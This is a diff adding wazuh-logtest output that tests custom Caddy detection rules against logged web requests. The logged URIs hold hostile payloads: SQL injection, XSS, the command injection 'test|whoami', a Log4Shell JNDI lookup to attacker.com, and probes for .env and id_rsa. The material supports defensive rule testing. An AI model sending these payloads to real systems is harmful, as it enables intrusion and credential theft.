@@ -1,0 +1,1240 @@
+Starting wazuh-logtest v4.14.5
+Type one log per line
+
+
+**Phase 1: Completed pre-decoding.
+	full event: '{"level":"info","ts":1781976027.6311817,"logger":"http.log.access.log0","msg":"handled request","request":{"remote_ip":"10.0.0.31","remote_port":"33700","client_ip":"10.0.0.31","proto":"HTTP/1.1","method":"GET","host":"localhost:8080","uri":"/login","headers":{"User-Agent":["curl/8.20.0"],"Accept":["*/*"]}},"bytes_read":0,"user_id":"","duration":0.000037574,"size":16,"status":200,"resp_headers":{"Server":["Caddy"],"Content-Type":["text/plain; charset=utf-8"]}}'
+
+**Phase 2: Completed decoding.
+	name: 'json'
+	bytes_read: '0'
+	duration: '0.000038'
+	level: 'info'
+	logger: 'http.log.access.log0'
+	msg: 'handled request'
+	request.client_ip: '10.0.0.31'
+	request.headers.Accept: '['*/*']'
+	request.headers.User-Agent: '['curl/8.20.0']'
+	request.host: 'localhost:8080'
+	request.method: 'GET'
+	request.proto: 'HTTP/1.1'
+	request.remote_ip: '10.0.0.31'
+	request.remote_port: '33700'
+	request.uri: '/login'
+	resp_headers.Content-Type: '['text/plain; charset=utf-8']'
+	resp_headers.Server: '['Caddy']'
+	size: '16'
+	status: '200'
+	ts: '1781976027.631182'
+
+**Phase 3: Completed filtering (rules).
+	id: '996021'
+	level: '3'
+	description: 'Caddy: Authentication endpoint access from 10.0.0.31'
+
+
+	groups: '['caddy', 'web', 'web', 'authentication']'
+	firedtimes: '1'
+	mail: 'False'
+**Alert to be generated.
+
+**Phase 1: Completed pre-decoding.
+	full event: '{"level":"info","ts":1781976069.375185,"logger":"http.log.access.log0","msg":"handled request","request":{"remote_ip":"10.0.0.97","remote_port":"38260","client_ip":"10.0.0.97","proto":"HTTP/1.1","method":"GET","host":"localhost:8080","uri":"/.env","headers":{"User-Agent":["curl/8.20.0"],"Accept":["*/*"]}},"bytes_read":0,"user_id":"","duration":0.000033232,"size":16,"status":200,"resp_headers":{"Server":["Caddy"],"Content-Type":["text/plain; charset=utf-8"]}}'
+
+**Phase 2: Completed decoding.
+	name: 'json'
+	bytes_read: '0'
+	duration: '0.000033'
+	level: 'info'
+	logger: 'http.log.access.log0'
+	msg: 'handled request'
+	request.client_ip: '10.0.0.97'
+	request.headers.Accept: '['*/*']'
+	request.headers.User-Agent: '['curl/8.20.0']'
+	request.host: 'localhost:8080'
+	request.method: 'GET'
+	request.proto: 'HTTP/1.1'
+	request.remote_ip: '10.0.0.97'
+	request.remote_port: '38260'
+	request.uri: '/.env'
+	resp_headers.Content-Type: '['text/plain; charset=utf-8']'
+	resp_headers.Server: '['Caddy']'
+	size: '16'
+	status: '200'
+	ts: '1781976069.375185'
+
+**Phase 3: Completed filtering (rules).
+	id: '996014'
+	level: '12'
+	description: 'Caddy: Credential or private key file access from 10.0.0.97 - /.env'
+	groups: '['caddy', 'web', 'web', 'attack', 'credential_access']'
+	firedtimes: '1'
+	mail: 'True'
+	mitre.id: '['T1552.001']'
+	mitre.tactic: '['Credential Access']'
+	mitre.technique: '['Credentials In Files']'
+**Alert to be generated.
+
+
+
+**Phase 1: Completed pre-decoding.
+	full event: '{"level":"info","ts":1781976051.2990315,"logger":"http.log.access.log0","msg":"handled request","request":{"remote_ip":"10.0.0.17","remote_port":"33492","client_ip":"10.0.0.17","proto":"HTTP/1.1","method":"GET","host":"localhost:8080","uri":"/?id=1%27%20OR%20%271%27%3D%271","headers":{"User-Agent":["curl/8.20.0"],"Accept":["*/*"]}},"bytes_read":0,"user_id":"","duration":0.000039467,"size":16,"status":200,"resp_headers":{"Server":["Caddy"],"Content-Type":["text/plain; charset=utf-8"]}}'
+
+**Phase 2: Completed decoding.
+	name: 'json'
+	bytes_read: '0'
+	duration: '0.000039'
+	level: 'info'
+	logger: 'http.log.access.log0'
+	msg: 'handled request'
+	request.client_ip: '10.0.0.17'
+	request.headers.Accept: '['*/*']'
+	request.headers.User-Agent: '['curl/8.20.0']'
+	request.host: 'localhost:8080'
+	request.method: 'GET'
+	request.proto: 'HTTP/1.1'
+
+
+	request.remote_ip: '10.0.0.17'
+	request.remote_port: '33492'
+	request.uri: '/?id=1%27%20OR%20%271%27%3D%271'
+	resp_headers.Content-Type: '['text/plain; charset=utf-8']'
+	resp_headers.Server: '['Caddy']'
+	size: '16'
+	status: '200'
+	ts: '1781976051.299031'
+
+**Phase 3: Completed filtering (rules).
+	id: '996004'
+	level: '10'
+	description: 'Caddy: SQL injection attempt from 10.0.0.17'
+	groups: '['caddy', 'web', 'web', 'attack', 'sql_injection']'
+	firedtimes: '1'
+	mail: 'False'
+	mitre.id: '['T1190']'
+	mitre.tactic: '['Initial Access']'
+	mitre.technique: '['Exploit Public-Facing Application']'
+**Alert to be generated.
+
+**Phase 1: Completed pre-decoding.
+	full event: '{"level":"info","ts":1781976051.0,"logger":"http.log.access.log0","msg":"handled request","request":{"remote_ip":"::1","remote_port":"33492","client_ip":"::1","proto":"HTTP/1.1","method":"GET","host":"localhost:8080","uri":"/search?q=1 UNION SELECT username,password FROM users","headers":{"User-Agent":["sqlmap/1.0"],"Accept":["*/*"]}},"bytes_read":0,"user_id":"","duration":0.0001,"size":16,"status":200,"resp_headers":{"Server":["Caddy"],"Content-Type":["text/plain; charset=utf-8"]}}'
+
+**Phase 2: Completed decoding.
+	name: 'json'
+	bytes_read: '0'
+	duration: '0.000100'
+	level: 'info'
+	logger: 'http.log.access.log0'
+	msg: 'handled request'
+	request.client_ip: '::1'
+	request.headers.Accept: '['*/*']'
+	request.headers.User-Agent: '['sqlmap/1.0']'
+	request.host: 'localhost:8080'
+	request.method: 'GET'
+	request.proto: 'HTTP/1.1'
+	request.remote_ip: '::1'
+	request.remote_port: '33492'
+	request.uri: '/search?q=1 UNION SELECT username,password FROM users'
+	resp_headers.Content-Type: '['text/plain; charset=utf-8']'
+	resp_headers.Server: '['Caddy']'
+	size: '16'
+	status: '200'
+	ts: '1781976051'
+
+**Phase 3: Completed filtering (rules).
+	id: '996004'
+	level: '10'
+	description: 'Caddy: SQL injection attempt from ::1'
+	groups: '['caddy', 'web', 'web', 'attack', 'sql_injection']'
+	firedtimes: '2'
+	mail: 'False'
+	mitre.id: '['T1190']'
+	mitre.tactic: '['Initial Access']'
+	mitre.technique: '['Exploit Public-Facing Application']'
+**Alert to be generated.
+
+
+
+
+
+
+
+
+
+
+
+**Phase 1: Completed pre-decoding.
+	full event: '{"level":"info","ts":1781976100.0,"logger":"http.log.access.log0","msg":"handled request","request":{"remote_ip":"10.0.0.5","remote_port":"44444","client_ip":"10.0.0.5","proto":"HTTP/1.1","method":"GET","host":"localhost:8080","uri":"/search?q=%3Cscript%3Ealert(1)%3C/script%3E","headers":{"User-Agent":["Mozilla/5.0"],"Accept":["*/*"]}},"bytes_read":0,"user_id":"","duration":0.0001,"size":16,"status":200,"resp_headers":{"Server":["Caddy"],"Content-Type":["text/plain; charset=utf-8"]}}'
+
+**Phase 2: Completed decoding.
+	name: 'json'
+	bytes_read: '0'
+	duration: '0.000100'
+	level: 'info'
+	logger: 'http.log.access.log0'
+	msg: 'handled request'
+	request.client_ip: '10.0.0.5'
+	request.headers.Accept: '['*/*']'
+	request.headers.User-Agent: '['Mozilla/5.0']'
+	request.host: 'localhost:8080'
+	request.method: 'GET'
+	request.proto: 'HTTP/1.1'
+	request.remote_ip: '10.0.0.5'
+	request.remote_port: '44444'
+	request.uri: '/search?q=%3Cscript%3Ealert(1)%3C/script%3E'
+	resp_headers.Content-Type: '['text/plain; charset=utf-8']'
+	resp_headers.Server: '['Caddy']'
+	size: '16'
+	status: '200'
+	ts: '1781976100'
+
+**Phase 3: Completed filtering (rules).
+	id: '996008'
+	level: '10'
+	description: 'Caddy: XSS attempt in URI from 10.0.0.5'
+	groups: '['caddy', 'web', 'web', 'attack', 'xss']'
+	firedtimes: '1'
+	mail: 'False'
+	mitre.id: '['T1059.007']'
+	mitre.tactic: '['Execution']'
+	mitre.technique: '['JavaScript']'
+**Alert to be generated.
+
+
+
+
+
+
+
+
+
+**Phase 1: Completed pre-decoding.
+	full event: '{"level":"info","ts":1781976101.0,"logger":"http.log.access.log0","msg":"handled request","request":{"remote_ip":"10.0.0.6","remote_port":"44445","client_ip":"10.0.0.6","proto":"HTTP/1.1","method":"GET","host":"localhost:8080","uri":"/page?input=test%7Cwhoami","headers":{"User-Agent":["Mozilla/5.0"],"Accept":["*/*"]}},"bytes_read":0,"user_id":"","duration":0.0001,"size":16,"status":200,"resp_headers":{"Server":["Caddy"],"Content-Type":["text/plain; charset=utf-8"]}}'
+
+**Phase 2: Completed decoding.
+	name: 'json'
+	bytes_read: '0'
+	duration: '0.000100'
+	level: 'info'
+	logger: 'http.log.access.log0'
+	msg: 'handled request'
+	request.client_ip: '10.0.0.6'
+	request.headers.Accept: '['*/*']'
+	request.headers.User-Agent: '['Mozilla/5.0']'
+	request.host: 'localhost:8080'
+	request.method: 'GET'
+	request.proto: 'HTTP/1.1'
+	request.remote_ip: '10.0.0.6'
+	request.remote_port: '44445'
+	request.uri: '/page?input=test%7Cwhoami'
+	resp_headers.Content-Type: '['text/plain; charset=utf-8']'
+	resp_headers.Server: '['Caddy']'
+	size: '16'
+	status: '200'
+	ts: '1781976101'
+
+**Phase 3: Completed filtering (rules).
+	id: '996009'
+	level: '10'
+	description: 'Caddy: Command injection attempt from 10.0.0.6'
+	groups: '['caddy', 'web', 'web', 'attack', 'command_injection']'
+	firedtimes: '1'
+	mail: 'False'
+	mitre.id: '['T1059']'
+	mitre.tactic: '['Execution']'
+	mitre.technique: '['Command and Scripting Interpreter']'
+**Alert to be generated.
+
+**Phase 1: Completed pre-decoding.
+	full event: '{"level":"info","ts":1781976102.0,"logger":"http.log.access.log0","msg":"handled request","request":{"remote_ip":"10.0.0.7","remote_port":"44446","client_ip":"10.0.0.7","proto":"HTTP/1.1","method":"GET","host":"localhost:8080","uri":"/","headers":{"User-Agent":["nikto/2.1.6"],"Accept":["*/*"]}},"bytes_read":0,"user_id":"","duration":0.0001,"size":16,"status":200,"resp_headers":{"Server":["Caddy"],"Content-Type":["text/plain; charset=utf-8"]}}'
+
+**Phase 2: Completed decoding.
+	name: 'json'
+	bytes_read: '0'
+	duration: '0.000100'
+	level: 'info'
+	logger: 'http.log.access.log0'
+	msg: 'handled request'
+	request.client_ip: '10.0.0.7'
+	request.headers.Accept: '['*/*']'
+	request.headers.User-Agent: '['nikto/2.1.6']'
+	request.host: 'localhost:8080'
+	request.method: 'GET'
+	request.proto: 'HTTP/1.1'
+	request.remote_ip: '10.0.0.7'
+	request.remote_port: '44446'
+	request.uri: '/'
+	resp_headers.Content-Type: '['text/plain; charset=utf-8']'
+	resp_headers.Server: '['Caddy']'
+	size: '16'
+	status: '200'
+	ts: '1781976102'
+
+**Phase 3: Completed filtering (rules).
+	id: '996010'
+	level: '8'
+	description: 'Caddy: Known attack or scanner tool detected from 10.0.0.7'
+	groups: '['caddy', 'web', 'web', 'recon', 'scan']'
+	firedtimes: '1'
+	mail: 'False'
+	mitre.id: '['T1595']'
+	mitre.tactic: '['Reconnaissance']'
+	mitre.technique: '['Active Scanning']'
+**Alert to be generated.
+
+**Phase 1: Completed pre-decoding.
+	full event: '{"level":"info","ts":1781976103.0,"logger":"http.log.access.log0","msg":"handled request","request":{"remote_ip":"10.0.0.8","remote_port":"44447","client_ip":"10.0.0.8","proto":"HTTP/1.1","method":"TRACE","host":"localhost:8080","uri":"/","headers":{"User-Agent":["Mozilla/5.0"],"Accept":["*/*"]}},"bytes_read":0,"user_id":"","duration":0.0001,"size":16,"status":200,"resp_headers":{"Server":["Caddy"],"Content-Type":["text/plain; charset=utf-8"]}}'
+
+**Phase 2: Completed decoding.
+	name: 'json'
+	bytes_read: '0'
+	duration: '0.000100'
+	level: 'info'
+	logger: 'http.log.access.log0'
+	msg: 'handled request'
+	request.client_ip: '10.0.0.8'
+	request.headers.Accept: '['*/*']'
+	request.headers.User-Agent: '['Mozilla/5.0']'
+	request.host: 'localhost:8080'
+	request.method: 'TRACE'
+	request.proto: 'HTTP/1.1'
+	request.remote_ip: '10.0.0.8'
+	request.remote_port: '44447'
+	request.uri: '/'
+	resp_headers.Content-Type: '['text/plain; charset=utf-8']'
+	resp_headers.Server: '['Caddy']'
+	size: '16'
+	status: '200'
+	ts: '1781976103'
+
+**Phase 3: Completed filtering (rules).
+	id: '996011'
+	level: '6'
+	description: 'Caddy: HTTP TRACE/TRACK method from 10.0.0.8 - possible cross-site tracing'
+	groups: '['caddy', 'web', 'web', 'attack']'
+	firedtimes: '1'
+	mail: 'False'
+	mitre.id: '['T1190']'
+	mitre.tactic: '['Initial Access']'
+	mitre.technique: '['Exploit Public-Facing Application']'
+**Alert to be generated.
+
+**Phase 1: Completed pre-decoding.
+	full event: '{"level":"info","ts":1781976104.0,"logger":"http.log.access.log0","msg":"handled request","request":{"remote_ip":"10.0.0.9","remote_port":"44448","client_ip":"10.0.0.9","proto":"HTTP/1.1","method":"GET","host":"localhost:8080","uri":"/?x=${jndi:ldap://attacker.com/a}","headers":{"User-Agent":["Mozilla/5.0"],"Accept":["*/*"]}},"bytes_read":0,"user_id":"","duration":0.0001,"size":16,"status":200,"resp_headers":{"Server":["Caddy"],"Content-Type":["text/plain; charset=utf-8"]}}'
+
+**Phase 2: Completed decoding.
+	name: 'json'
+	bytes_read: '0'
+	duration: '0.000100'
+	level: 'info'
+	logger: 'http.log.access.log0'
+	msg: 'handled request'
+	request.client_ip: '10.0.0.9'
+	request.headers.Accept: '['*/*']'
+	request.headers.User-Agent: '['Mozilla/5.0']'
+	request.host: 'localhost:8080'
+	request.method: 'GET'
+	request.proto: 'HTTP/1.1'
+	request.remote_ip: '10.0.0.9'
+	request.remote_port: '44448'
+	request.uri: '/?x=${jndi:ldap://attacker.com/a}'
+	resp_headers.Content-Type: '['text/plain; charset=utf-8']'
+	resp_headers.Server: '['Caddy']'
+	size: '16'
+	status: '200'
+	ts: '1781976104'
+
+**Phase 3: Completed filtering (rules).
+	id: '996012'
+	level: '15'
+	description: 'Caddy: Log4Shell JNDI injection attempt from 10.0.0.9'
+	groups: '['caddy', 'web', 'web', 'attack']'
+	firedtimes: '1'
+	mail: 'True'
+	mitre.id: '['T1190']'
+	mitre.tactic: '['Initial Access']'
+	mitre.technique: '['Exploit Public-Facing Application']'
+**Alert to be generated.
+
+**Phase 1: Completed pre-decoding.
+	full event: '{"level":"info","ts":1781976105.0,"logger":"http.log.access.log0","msg":"handled request","request":{"remote_ip":"10.0.0.10","remote_port":"44449","client_ip":"10.0.0.10","proto":"HTTP/1.1","method":"GET","host":"localhost:8080","uri":"/wp-config.php","headers":{"User-Agent":["Mozilla/5.0"],"Accept":["*/*"]}},"bytes_read":0,"user_id":"","duration":0.0001,"size":16,"status":200,"resp_headers":{"Server":["Caddy"],"Content-Type":["text/plain; charset=utf-8"]}}'
+
+**Phase 2: Completed decoding.
+	name: 'json'
+	bytes_read: '0'
+	duration: '0.000100'
+	level: 'info'
+	logger: 'http.log.access.log0'
+	msg: 'handled request'
+	request.client_ip: '10.0.0.10'
+	request.headers.Accept: '['*/*']'
+	request.headers.User-Agent: '['Mozilla/5.0']'
+	request.host: 'localhost:8080'
+	request.method: 'GET'
+	request.proto: 'HTTP/1.1'
+	request.remote_ip: '10.0.0.10'
+	request.remote_port: '44449'
+	request.uri: '/wp-config.php'
+	resp_headers.Content-Type: '['text/plain; charset=utf-8']'
+	resp_headers.Server: '['Caddy']'
+	size: '16'
+	status: '200'
+	ts: '1781976105'
+
+**Phase 3: Completed filtering (rules).
+	id: '996013'
+	level: '8'
+	description: 'Caddy: Sensitive file access attempt from 10.0.0.10 - /wp-config.php'
+	groups: '['caddy', 'web', 'web', 'recon']'
+	firedtimes: '1'
+	mail: 'False'
+	mitre.id: '['T1083']'
+	mitre.tactic: '['Discovery']'
+	mitre.technique: '['File and Directory Discovery']'
+**Alert to be generated.
+
+**Phase 1: Completed pre-decoding.
+	full event: '{"level":"info","ts":1781976200.0,"logger":"http.log.access.log0","msg":"handled request","request":{"remote_ip":"10.0.0.20","remote_port":"55000","client_ip":"10.0.0.20","proto":"HTTP/1.1","method":"GET","host":"localhost:8080","uri":"/.env","headers":{"User-Agent":["Mozilla/5.0"],"Accept":["*/*"]}},"bytes_read":0,"user_id":"","duration":0.0001,"size":16,"status":200,"resp_headers":{"Server":["Caddy"],"Content-Type":["text/plain; charset=utf-8"]}}'
+
+**Phase 2: Completed decoding.
+	name: 'json'
+	bytes_read: '0'
+	duration: '0.000100'
+	level: 'info'
+	logger: 'http.log.access.log0'
+	msg: 'handled request'
+	request.client_ip: '10.0.0.20'
+	request.headers.Accept: '['*/*']'
+	request.headers.User-Agent: '['Mozilla/5.0']'
+	request.host: 'localhost:8080'
+	request.method: 'GET'
+	request.proto: 'HTTP/1.1'
+	request.remote_ip: '10.0.0.20'
+	request.remote_port: '55000'
+	request.uri: '/.env'
+	resp_headers.Content-Type: '['text/plain; charset=utf-8']'
+	resp_headers.Server: '['Caddy']'
+	size: '16'
+	status: '200'
+	ts: '1781976200'
+
+**Phase 3: Completed filtering (rules).
+	id: '996014'
+	level: '12'
+	description: 'Caddy: Credential or private key file access from 10.0.0.20 - /.env'
+	groups: '['caddy', 'web', 'web', 'attack', 'credential_access']'
+	firedtimes: '2'
+	mail: 'True'
+	mitre.id: '['T1552.001']'
+	mitre.tactic: '['Credential Access']'
+	mitre.technique: '['Credentials In Files']'
+**Alert to be generated.
+
+**Phase 1: Completed pre-decoding.
+	full event: '{"level":"info","ts":1781976201.0,"logger":"http.log.access.log0","msg":"handled request","request":{"remote_ip":"10.0.0.20","remote_port":"55001","client_ip":"10.0.0.20","proto":"HTTP/1.1","method":"GET","host":"localhost:8080","uri":"/id_rsa","headers":{"User-Agent":["Mozilla/5.0"],"Accept":["*/*"]}},"bytes_read":0,"user_id":"","duration":0.0001,"size":16,"status":200,"resp_headers":{"Server":["Caddy"],"Content-Type":["text/plain; charset=utf-8"]}}'
+
+**Phase 2: Completed decoding.
+	name: 'json'
+	bytes_read: '0'
+	duration: '0.000100'
+	level: 'info'
+	logger: 'http.log.access.log0'
+	msg: 'handled request'
+	request.client_ip: '10.0.0.20'
+	request.headers.Accept: '['*/*']'
+	request.headers.User-Agent: '['Mozilla/5.0']'
+	request.host: 'localhost:8080'
+	request.method: 'GET'
+	request.proto: 'HTTP/1.1'
+	request.remote_ip: '10.0.0.20'
+	request.remote_port: '55001'
+	request.uri: '/id_rsa'
+	resp_headers.Content-Type: '['text/plain; charset=utf-8']'
+	resp_headers.Server: '['Caddy']'
+	size: '16'
+	status: '200'
+	ts: '1781976201'
+
+**Phase 3: Completed filtering (rules).
+	id: '996014'
+	level: '12'
+	description: 'Caddy: Credential or private key file access from 10.0.0.20 - /id_rsa'
+	groups: '['caddy', 'web', 'web', 'attack', 'credential_access']'
+	firedtimes: '3'
+	mail: 'True'
+	mitre.id: '['T1552.001']'
+	mitre.tactic: '['Credential Access']'
+	mitre.technique: '['Credentials In Files']'
+**Alert to be generated.
+
+**Phase 1: Completed pre-decoding.
+	full event: '{"level":"info","ts":1781976202.0,"logger":"http.log.access.log0","msg":"handled request","request":{"remote_ip":"10.0.0.21","remote_port":"55002","client_ip":"10.0.0.21","proto":"HTTP/1.1","method":"GET","host":"localhost:8080","uri":"/database.sql","headers":{"User-Agent":["Mozilla/5.0"],"Accept":["*/*"]}},"bytes_read":0,"user_id":"","duration":0.0001,"size":16,"status":200,"resp_headers":{"Server":["Caddy"],"Content-Type":["text/plain; charset=utf-8"]}}'
+
+**Phase 2: Completed decoding.
+	name: 'json'
+	bytes_read: '0'
+	duration: '0.000100'
+	level: 'info'
+	logger: 'http.log.access.log0'
+	msg: 'handled request'
+	request.client_ip: '10.0.0.21'
+	request.headers.Accept: '['*/*']'
+	request.headers.User-Agent: '['Mozilla/5.0']'
+	request.host: 'localhost:8080'
+	request.method: 'GET'
+	request.proto: 'HTTP/1.1'
+	request.remote_ip: '10.0.0.21'
+	request.remote_port: '55002'
+	request.uri: '/database.sql'
+	resp_headers.Content-Type: '['text/plain; charset=utf-8']'
+	resp_headers.Server: '['Caddy']'
+	size: '16'
+	status: '200'
+	ts: '1781976202'
+
+**Phase 3: Completed filtering (rules).
+	id: '996015'
+	level: '10'
+	description: 'Caddy: Backup or database dump file access from 10.0.0.21 - /database.sql'
+	groups: '['caddy', 'web', 'web', 'recon']'
+	firedtimes: '1'
+	mail: 'False'
+	mitre.id: '['T1530']'
+	mitre.tactic: '['Collection']'
+	mitre.technique: '['Data from Cloud Storage']'
+**Alert to be generated.
+
+
+
+**Phase 1: Completed pre-decoding.
+	full event: '{"level":"info","ts":1781976203.0,"logger":"http.log.access.log0","msg":"handled request","request":{"remote_ip":"10.0.0.21","remote_port":"55003","client_ip":"10.0.0.21","proto":"HTTP/1.1","method":"GET","host":"localhost:8080","uri":"/config.php.bak","headers":{"User-Agent":["Mozilla/5.0"],"Accept":["*/*"]}},"bytes_read":0,"user_id":"","duration":0.0001,"size":16,"status":200,"resp_headers":{"Server":["Caddy"],"Content-Type":["text/plain; charset=utf-8"]}}'
+
+**Phase 2: Completed decoding.
+	name: 'json'
+	bytes_read: '0'
+	duration: '0.000100'
+	level: 'info'
+	logger: 'http.log.access.log0'
+	msg: 'handled request'
+	request.client_ip: '10.0.0.21'
+	request.headers.Accept: '['*/*']'
+	request.headers.User-Agent: '['Mozilla/5.0']'
+	request.host: 'localhost:8080'
+	request.method: 'GET'
+	request.proto: 'HTTP/1.1'
+	request.remote_ip: '10.0.0.21'
+	request.remote_port: '55003'
+	request.uri: '/config.php.bak'
+	resp_headers.Content-Type: '['text/plain; charset=utf-8']'
+	resp_headers.Server: '['Caddy']'
+	size: '16'
+	status: '200'
+	ts: '1781976203'
+
+**Phase 3: Completed filtering (rules).
+	id: '996015'
+	level: '10'
+	description: 'Caddy: Backup or database dump file access from 10.0.0.21 - /config.php.bak'
+	groups: '['caddy', 'web', 'web', 'recon']'
+	firedtimes: '2'
+	mail: 'False'
+	mitre.id: '['T1530']'
+	mitre.tactic: '['Collection']'
+	mitre.technique: '['Data from Cloud Storage']'
+**Alert to be generated.
+
+
+
+**Phase 1: Completed pre-decoding.
+	full event: '{"level":"info","ts":1781976204.0,"logger":"http.log.access.log0","msg":"handled request","request":{"remote_ip":"10.0.0.22","remote_port":"55004","client_ip":"10.0.0.22","proto":"HTTP/1.1","method":"GET","host":"localhost:8080","uri":"/.git/config","headers":{"User-Agent":["Mozilla/5.0"],"Accept":["*/*"]}},"bytes_read":0,"user_id":"","duration":0.0001,"size":16,"status":200,"resp_headers":{"Server":["Caddy"],"Content-Type":["text/plain; charset=utf-8"]}}'
+
+**Phase 2: Completed decoding.
+	name: 'json'
+	bytes_read: '0'
+	duration: '0.000100'
+	level: 'info'
+	logger: 'http.log.access.log0'
+	msg: 'handled request'
+	request.client_ip: '10.0.0.22'
+	request.headers.Accept: '['*/*']'
+	request.headers.User-Agent: '['Mozilla/5.0']'
+	request.host: 'localhost:8080'
+	request.method: 'GET'
+	request.proto: 'HTTP/1.1'
+	request.remote_ip: '10.0.0.22'
+	request.remote_port: '55004'
+	request.uri: '/.git/config'
+	resp_headers.Content-Type: '['text/plain; charset=utf-8']'
+	resp_headers.Server: '['Caddy']'
+	size: '16'
+	status: '200'
+	ts: '1781976204'
+
+**Phase 3: Completed filtering (rules).
+	id: '996016'
+	level: '10'
+	description: 'Caddy: Source control artifact access from 10.0.0.22 - /.git/config'
+	groups: '['caddy', 'web', 'web', 'recon']'
+	firedtimes: '1'
+	mail: 'False'
+	mitre.id: '['T1213']'
+	mitre.tactic: '['Collection']'
+	mitre.technique: '['Data from Information Repositories']'
+**Alert to be generated.
+
+
+
+**Phase 1: Completed pre-decoding.
+	full event: '{"level":"info","ts":1781976205.0,"logger":"http.log.access.log0","msg":"handled request","request":{"remote_ip":"10.0.0.23","remote_port":"55005","client_ip":"10.0.0.23","proto":"HTTP/1.1","method":"GET","host":"localhost:8080","uri":"/error.log","headers":{"User-Agent":["Mozilla/5.0"],"Accept":["*/*"]}},"bytes_read":0,"user_id":"","duration":0.0001,"size":16,"status":200,"resp_headers":{"Server":["Caddy"],"Content-Type":["text/plain; charset=utf-8"]}}'
+
+**Phase 2: Completed decoding.
+	name: 'json'
+	bytes_read: '0'
+	duration: '0.000100'
+	level: 'info'
+	logger: 'http.log.access.log0'
+	msg: 'handled request'
+	request.client_ip: '10.0.0.23'
+	request.headers.Accept: '['*/*']'
+	request.headers.User-Agent: '['Mozilla/5.0']'
+	request.host: 'localhost:8080'
+	request.method: 'GET'
+	request.proto: 'HTTP/1.1'
+	request.remote_ip: '10.0.0.23'
+	request.remote_port: '55005'
+	request.uri: '/error.log'
+	resp_headers.Content-Type: '['text/plain; charset=utf-8']'
+	resp_headers.Server: '['Caddy']'
+	size: '16'
+	status: '200'
+	ts: '1781976205'
+
+**Phase 3: Completed filtering (rules).
+	id: '996017'
+	level: '8'
+	description: 'Caddy: Application log file access from 10.0.0.23 - /error.log'
+	groups: '['caddy', 'web', 'web', 'recon']'
+	firedtimes: '1'
+	mail: 'False'
+	mitre.id: '['T1083']'
+	mitre.tactic: '['Discovery']'
+	mitre.technique: '['File and Directory Discovery']'
+**Alert to be generated.
+
+
+
+**Phase 1: Completed pre-decoding.
+	full event: '{"level":"info","ts":1781976205.0,"logger":"http.log.access.log0","msg":"handled request","request":{"remote_ip":"10.0.0.23","remote_port":"55005","client_ip":"10.0.0.23","proto":"HTTP/1.1","method":"GET","host":"localhost:8080","uri":"/insecure.py","headers":{"User-Agent":["Mozilla/5.0"],"Accept":["*/*"]}},"bytes_read":0,"user_id":"","duration":0.0001,"size":16,"status":200,"resp_headers":{"Server":["Caddy"],"Content-Type":["text/plain; charset=utf-8"]}}'
+
+**Phase 2: Completed decoding.
+	name: 'json'
+	bytes_read: '0'
+	duration: '0.000100'
+	level: 'info'
+	logger: 'http.log.access.log0'
+	msg: 'handled request'
+	request.client_ip: '10.0.0.23'
+	request.headers.Accept: '['*/*']'
+	request.headers.User-Agent: '['Mozilla/5.0']'
+	request.host: 'localhost:8080'
+	request.method: 'GET'
+	request.proto: 'HTTP/1.1'
+	request.remote_ip: '10.0.0.23'
+	request.remote_port: '55005'
+	request.uri: '/insecure.py'
+	resp_headers.Content-Type: '['text/plain; charset=utf-8']'
+	resp_headers.Server: '['Caddy']'
+	size: '16'
+	status: '200'
+	ts: '1781976205'
+
+**Phase 3: Completed filtering (rules).
+	id: '996000'
+	level: '0'
+	description: 'Caddy web server access log.'
+	groups: '['caddy', 'web']'
+	firedtimes: '1'
+	mail: 'False'
+
+
+
+**Phase 1: Completed pre-decoding.
+	full event: '{"level":"info","ts":1781976205.0,"logger":"http.log.access.log0","msg":"handled request","request":{"remote_ip":"10.0.0.23","remote_port":"55005","client_ip":"10.0.0.23","proto":"HTTP/1.1","method":"GET","host":"localhost:8080","uri":"/passwords.txt","headers":{"User-Agent":["Mozilla/5.0"],"Accept":["*/*"]}},"bytes_read":0,"user_id":"","duration":0.0001,"size":16,"status":200,"resp_headers":{"Server":["Caddy"],"Content-Type":["text/plain; charset=utf-8"]}}'
+
+**Phase 2: Completed decoding.
+	name: 'json'
+	bytes_read: '0'
+	duration: '0.000100'
+	level: 'info'
+	logger: 'http.log.access.log0'
+	msg: 'handled request'
+	request.client_ip: '10.0.0.23'
+	request.headers.Accept: '['*/*']'
+	request.headers.User-Agent: '['Mozilla/5.0']'
+	request.host: 'localhost:8080'
+	request.method: 'GET'
+	request.proto: 'HTTP/1.1'
+	request.remote_ip: '10.0.0.23'
+	request.remote_port: '55005'
+	request.uri: '/passwords.txt'
+	resp_headers.Content-Type: '['text/plain; charset=utf-8']'
+	resp_headers.Server: '['Caddy']'
+	size: '16'
+	status: '200'
+	ts: '1781976205'
+
+**Phase 3: Completed filtering (rules).
+	id: '996020'
+	level: '8'
+	description: 'Caddy: Request for suspicious filename from 10.0.0.23 - /passwords.txt'
+	groups: '['caddy', 'web', 'web', 'recon']'
+	firedtimes: '1'
+	mail: 'False'
+	mitre.id: '['T1083']'
+	mitre.tactic: '['Discovery']'
+	mitre.technique: '['File and Directory Discovery']'
+**Alert to be generated.
+
+
+
+**Phase 1: Completed pre-decoding.
+	full event: '{"level":"info","ts":1781976205.0,"logger":"http.log.access.log0","msg":"handled request","request":{"remote_ip":"10.0.0.23","remote_port":"55005","client_ip":"10.0.0.23","proto":"HTTP/1.1","method":"GET","host":"localhost:8080","uri":"/confidential-file.txt","headers":{"User-Agent":["Mozilla/5.0"],"Accept":["*/*"]}},"bytes_read":0,"user_id":"","duration":0.0001,"size":16,"status":200,"resp_headers":{"Server":["Caddy"],"Content-Type":["text/plain; charset=utf-8"]}}'
+
+**Phase 2: Completed decoding.
+	name: 'json'
+	bytes_read: '0'
+	duration: '0.000100'
+	level: 'info'
+	logger: 'http.log.access.log0'
+	msg: 'handled request'
+	request.client_ip: '10.0.0.23'
+	request.headers.Accept: '['*/*']'
+	request.headers.User-Agent: '['Mozilla/5.0']'
+	request.host: 'localhost:8080'
+	request.method: 'GET'
+	request.proto: 'HTTP/1.1'
+	request.remote_ip: '10.0.0.23'
+	request.remote_port: '55005'
+	request.uri: '/confidential-file.txt'
+	resp_headers.Content-Type: '['text/plain; charset=utf-8']'
+	resp_headers.Server: '['Caddy']'
+	size: '16'
+	status: '200'
+	ts: '1781976205'
+
+**Phase 3: Completed filtering (rules).
+	id: '996020'
+	level: '8'
+	description: 'Caddy: Request for suspicious filename from 10.0.0.23 - /confidential-file.txt'
+	groups: '['caddy', 'web', 'web', 'recon']'
+	firedtimes: '2'
+	mail: 'False'
+	mitre.id: '['T1083']'
